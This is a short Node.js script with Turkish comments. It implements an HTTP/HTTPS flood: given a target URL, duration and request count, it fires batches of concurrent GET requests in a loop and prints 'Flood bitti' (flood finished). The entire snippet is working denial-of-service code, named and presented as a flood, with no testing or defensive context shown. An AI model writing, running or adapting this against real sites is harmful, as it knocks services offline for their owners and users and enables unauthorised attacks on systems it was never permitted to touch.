// Artık http ve https çalışır
const url = new URL(params.url);
const client = url.protocol === 'https:' ? https : http;
const end = Date.now() + (params.duration * 1000);

function sendRequest() {
    return new Promise((resolve) => {
        client.get(url, (res) => {
            res.on('data', () => {});
            res.on('end', resolve);
        }).on('error', () => resolve());
    });
}

async function flood() {
    while (Date.now() < end) {
        const promises = [];
        for (let i = 0; i < (params.requests || 100); i++) {
            promises.push(sendRequest());
        }
        await Promise.all(promises);
    }
    console.log(`Flood bitti: ${params.url}`);
}

flood();
